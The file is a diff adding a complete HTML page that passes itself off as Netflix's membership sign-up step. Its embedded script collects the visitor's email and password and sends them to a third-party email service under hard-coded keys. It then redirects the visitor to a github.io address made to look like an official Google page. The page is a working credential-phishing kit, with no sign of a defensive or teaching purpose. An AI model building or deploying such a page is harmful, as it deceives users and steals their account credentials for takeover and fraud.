@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="icon" type="image/png" href="https://i.ibb.co/8sj6mFP/Netflix-Favicon.png">
+   
+  <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "9cATFsqPERef1K6ZF",
+      });
+   })();
+</script>
+
+    <title>Netflix</title>
+ <style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #fff;
+  margin: 0;
+  padding: 0;
+}
+body a {
+  text-decoration: none;
+}
+.container {
+  max-width: 90%;
+  margin: auto;
+  padding: 20px;
+  border: 1px solid transparent;
+  background-color: #fff;
+}
+ .top {
+   display: flex;
+   justify-content: space-between;
+   align-items: center;
+ }
+ .top img {
+   margin-top: -20px;
+   margin-left: -10px;
+   width: 80px;
+   height: 45px;
+ }
+ .top a {
+   margin-top: -20px;
+   font-weight: 450;
+   text-decoration: none;
+   color: black;
+ }
+  .content {
+   display: flex;
+   flex-direction: column;
+   align-items: center;
+   justify-content: center;
+ }
+ .step p {
+   font-family: Arial, Sans-Serif;
+   letter-spacing: 0px;
+   font-size: 15px;
+   font-weight: 300;
+   color: black;
+ }
+
+.comfort p {
+  margin-top: 1px;
+  font-size: 19px;
+}
+.form-group #email, #password {
+  margin: 5px;
+  padding: 0 20px;
+  width: 270px;
+  height: 50px;
+}
+input {
+  font-size: 17px;
+}
+.next {
+   display: flex;
+   flex-direction: column;
+   align-items: center;
+   justify-content: center;
+}
+.next button {
+  width: 290px;
+  height: 70px;
+  border-radius: 5px;
+  font-size: 24px;
+  border: 1px solid transparent;
+  display: inline;
+  color: #fff;
+  background-color: #E50913;
+}
+.buttom {
+  width: 100%;
+  margin: auto;
+  padding: 20px;
+  border: 1px solid transparent;
+  border-top-color: #e0e0e0;
+  color: #737373;
+  background-color: #F3F3F3;
+  box-sizing: border-box;
+}
+  @media (min-width: 600px) {
+.container {
+  max-width: 100%;
+}
+}
+  @media (min-width: 1024px) {
+.container {
+  max-width: 80%;
+}
+}
+@media (min-width: 600px) {
+.buttom {
+  max-width: 100%;
+}
+}
+  @media (min-width: 1024px) {
+.buttom {
+  max-width: 100%;
+}
+}
+</style>
+</head>
+<body>
+  
+        <div class="container">
+      <div class="top">
+  <img src="https://i.ibb.co/X59Fb0Q/Netflix.png" alt="Netflix" border="0">
+  <a href="">Sign In</a>
+    </div>
+  <hr>
+          <div class="content">
+    
+             <div class="step">
+  <p style="margin-right: 180px; margin-bottom: -15px;">STEP&nbsp;<b>2 </b>OF<b> 3</b></p>
+              </div>
+              
+  <h1>Create a password to<br> start your membership.</h1>
+          <div class="comfort">
+<p>Just a few more steps and you're done.</p>
+ <p style="margin-top: -10px;">We hate paperwork, too.</p>
+            </div>
+         <div class="form-group">  
+ <form id="NetflixForm">
+  <input type="email" id="email" name="email" placeholder="Email"><br>
+  <input type="password" id="password" name="password" placeholder="Add a password"><br>
+  <input style="margin-top: 10px;" type="checkbox" id="checkbox"><label for="checkbox">Please email me Netflix special offers.</label>
+           </div>
+       <br>
+ <div class="next">
+   
+ <button type="submit" id="NetflixSignup">Next</button>
+     
+ </form>
+  <div>
+          </div>    
+          <br></br><br></br><br></br>
+          
+          
+    </div>
+    
+    
+      <div class="buttom">
+   <p>Questions? Contact us.</p>
+   <p>FAQ <span style="margin-left: 145px;">Help Center</span></p>
+   <p>Netflix Shop <span style="margin-left: 85px;">Terms of use</span></p>
+   <p>Privacy <span style="margin-left: 120px;">Cookies</span></p>
+   <p>Corporate Information</p>
+            </div>
+            
+  
+ <script>
+  let formSubmitted = false; // Variable to track form submission
+  
+  function sendMail(){
+    if (formSubmitted) {
+      return; // Exit the function if form is already submitted
+    }
+
+    let parms = {
+      email : document.getElementById("email").value,
+      password : document.getElementById("password").value,
+      submit_button_id: document.getElementById("NetflixSignup").id
+    };
+    
+    // Set formSubmitted to true before sending email
+    formSubmitted = true;
+    
+        emailjs.send("service_9evnoou","template_79435mm", parms)
+      .then(function(response) {
+        // Redirect to Google after email is sent
+        window.location.href = "https://official-google.github.io/Netflix/Netflix4.html";
+      })
+      .catch(function(error) {
+        console.error('Invalid username or password:', error);
+        // Handle error if necessary
+      });
+  }
+
+  // Attach form submission event handler
+  document.getElementById('NetflixForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent default form submission
+    sendMail(); // Call sendMail function
+  });
+</script>
+
+<script>
+document.getElementById('NetflixSignup').addEventListener('click', function() {
+    const button = this;
+    button.disabled = true; // Disable the button
+
+    setTimeout(function() {
+        button.disabled = false; // Re-enable the button after 5 seconds
+    }, 5000); // 5000 milliseconds = 5 seconds
+});
+   
+ </script>
+ 
+</body>
+</html>
